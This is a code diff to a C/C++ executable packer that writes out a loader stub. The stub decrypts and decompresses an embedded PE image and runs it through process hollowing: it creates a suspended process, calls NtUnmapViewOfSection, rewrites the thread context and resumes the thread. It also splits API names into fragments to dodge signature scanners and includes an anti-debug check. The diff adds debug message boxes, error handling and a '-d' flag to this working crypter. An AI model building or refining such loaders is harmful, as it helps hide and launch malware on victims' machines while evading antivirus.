@@ -34,6 +34,15 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "#include <stdio.h>\n");
     fprintf(f, "#include <string.h>\n\n");
 
+    fprintf(f, "/* Uncomment for debugging */\n");
+    fprintf(f, "/* #define DEBUG_MODE */\n\n");
+
+    fprintf(f, "#ifdef DEBUG_MODE\n");
+    fprintf(f, "#define DEBUG_PRINT(msg) MessageBoxA(NULL, msg, \"Debug\", MB_OK)\n");
+    fprintf(f, "#else\n");
+    fprintf(f, "#define DEBUG_PRINT(msg)\n");
+    fprintf(f, "#endif\n\n");
+
     fprintf(f, "#define S1 \"Cre\" \"ate\" \"Pro\" \"cess\" \"A\"\n");
     fprintf(f, "#define S2 \"Nt\" \"Unmap\" \"View\" \"Of\" \"Section\"\n");
     fprintf(f, "#define S3 \"ntd\" \"ll.\" \"dll\"\n\n");
@@ -89,14 +98,17 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "}\n\n");
 
     fprintf(f, "int main(int argc, char* argv[]) {\n");
+    fprintf(f, "    DEBUG_PRINT(\"Step 1: Starting unpacker\");\n");
     fprintf(f, "    char exePath[MAX_PATH];\n");
     fprintf(f, "    volatile DWORD antiDebug = GetTickCount();\n");
     fprintf(f, "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n");
 
+    fprintf(f, "    DEBUG_PRINT(\"Step 2: Got module filename\");\n");
     fprintf(f, "    DWORD temp1 = 0, temp2 = 0;\n");
     fprintf(f, "    temp1 = GetCurrentProcessId();\n");
     fprintf(f, "    if (temp1 == 0) return 1;\n\n");
 
+    fprintf(f, "    DEBUG_PRINT(\"Step 3: Opening file\");\n");
     fprintf(f, "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n");
     fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n\n");
 
@@ -105,6 +117,8 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
 
     fprintf(f, "    unsigned char* fileData = (unsigned char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\n");
     fprintf(f, "    if (!fileData) { CloseHandle(hMapping); CloseHandle(hFile); return 1; }\n\n");
+
+    fprintf(f, "    DEBUG_PRINT(\"Step 4: File mapped successfully\");\n");
 
     fprintf(f, "    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;\n");
     fprintf(f, "    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileData + dosHeader->e_lfanew);\n");
@@ -116,9 +130,10 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
 
     fprintf(f, "    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {\n");
     fprintf(f, "        temp2 = sections[i].Characteristics;\n");
-    fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");
+    fprintf(f, "        if (sections[i].SizeOfRawData > sizeof(struct PackedSection)) {\n");
     fprintf(f, "            struct PackedSection* testSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
     fprintf(f, "            if (testSec->magic == 0x%08lXUL) {\n", (unsigned long)magic);
+    fprintf(f, "                DEBUG_PRINT(\"Step 5: Found packed section\");\n");
     fprintf(f, "                packedSec = testSec;\n");
     fprintf(f, "                packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
     fprintf(f, "                break;\n");
@@ -130,6 +145,7 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
     fprintf(f, "        CloseHandle(hMapping);\n");
     fprintf(f, "        CloseHandle(hFile);\n");
+    fprintf(f, "        MessageBoxA(NULL, \"Packed section not found!\", \"Error\", MB_OK | MB_ICONERROR);\n");
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
@@ -147,10 +163,16 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    }\n\n");
 
     fprintf(f, "    memcpy(decrypted, packedData, packedSec->packed_size);\n");
+    fprintf(f, "    DEBUG_PRINT(\"Step 6: Decrypting\");\n");
     fprintf(f, "    decryptXOR(decrypted, packedSec->packed_size, packedSec->key);\n");
+    fprintf(f, "    DEBUG_PRINT(\"Step 7: Decompressing\");\n");
     fprintf(f, "    DWORD decompSize = decompressRLE(decrypted, packedSec->packed_size, decompressed, packedSec->unpacked_size);\n\n");
 
     fprintf(f, "    if (decompSize != packedSec->unpacked_size) {\n");
+    fprintf(f, "        char errorMsg[256];\n");
+    fprintf(f, "        sprintf(errorMsg, \"Decompression failed!\\nExpected: %%lu bytes\\nGot: %%lu bytes\", \n");
+    fprintf(f, "                packedSec->unpacked_size, decompSize);\n");
+    fprintf(f, "        MessageBoxA(NULL, errorMsg, \"Error\", MB_OK | MB_ICONERROR);\n");
     fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
     fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
@@ -160,6 +182,15 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    }\n\n");
 
     fprintf(f, "    IMAGE_DOS_HEADER* newDosHeader = (IMAGE_DOS_HEADER*)decompressed;\n");
+    fprintf(f, "    if (newDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {\n");
+    fprintf(f, "        MessageBoxA(NULL, \"Invalid DOS signature after decompression!\", \"Error\", MB_OK | MB_ICONERROR);\n");
+    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
+    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
+    fprintf(f, "        UnmapViewOfFile(fileData);\n");
+    fprintf(f, "        CloseHandle(hMapping);\n");
+    fprintf(f, "        CloseHandle(hFile);\n");
+    fprintf(f, "        return 1;\n");
+    fprintf(f, "    }\n");
     fprintf(f, "    IMAGE_NT_HEADERS* newNtHeaders = (IMAGE_NT_HEADERS*)(decompressed + newDosHeader->e_lfanew);\n\n");
 
     fprintf(f, "    char cmdLine[32768];\n");
@@ -183,6 +214,9 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), procName);\n\n");
 
     fprintf(f, "    if (!myCreateProcess(exePath, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n");
+    fprintf(f, "        char errMsg[256];\n");
+    fprintf(f, "        sprintf(errMsg, \"CreateProcess failed! Error: %%lu\", GetLastError());\n");
+    fprintf(f, "        MessageBoxA(NULL, errMsg, \"Error\", MB_OK | MB_ICONERROR);\n");
     fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
     fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
@@ -190,6 +224,8 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "        CloseHandle(hFile);\n");
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
+
+    fprintf(f, "    DEBUG_PRINT(\"Step 8: Process created in suspended state\");\n");
 
     fprintf(f, "    CONTEXT ctx;\n");
     fprintf(f, "    memset(&ctx, 0, sizeof(ctx));\n");
@@ -285,6 +321,7 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    ctx.Eax = (DWORD)newImageBase + newNtHeaders->OptionalHeader.AddressOfEntryPoint;\n");
     fprintf(f, "    SetThreadContext(pi.hThread, &ctx);\n\n");
 
+    fprintf(f, "    DEBUG_PRINT(\"Step 9: Resuming thread\");\n");
     fprintf(f, "    ResumeThread(pi.hThread);\n\n");
 
     fprintf(f, "    VirtualFree(decrypted, 0, MEM_RELEASE);\n");
@@ -635,13 +672,16 @@ public:
         if (argc < 2) {
             fprintf(stderr, "Usage: %s <input.exe> [OPTIONS]\n\n", argv[0]);
             printf("Options:\n");
-            printf("  -o <file>         Specify output file\n\n");
+            printf("  -o <file>         Specify output file\n");
+            printf("  -d                Enable debug mode in stub\n\n");
             printf("Example: %s program.exe -o packed.exe\n", argv[0]);
+            printf("Example: %s program.exe -o packed.exe -d\n", argv[0]);
             return false;
         }
 
         inputPath = argv[1];
         bool outputFlag = false;
+        bool debugMode = false;
 
         for (int i = 2; i < argc; i++) {
             std::string arg = argv[i];
@@ -650,6 +690,10 @@ public:
                 outputPath = argv[i + 1];
                 outputFlag = true;
                 i++;
+            }
+            else if (arg == "-d") {
+                debugMode = true;
+                printf("[*] Debug mode enabled in stub\n");
             }
         }
 
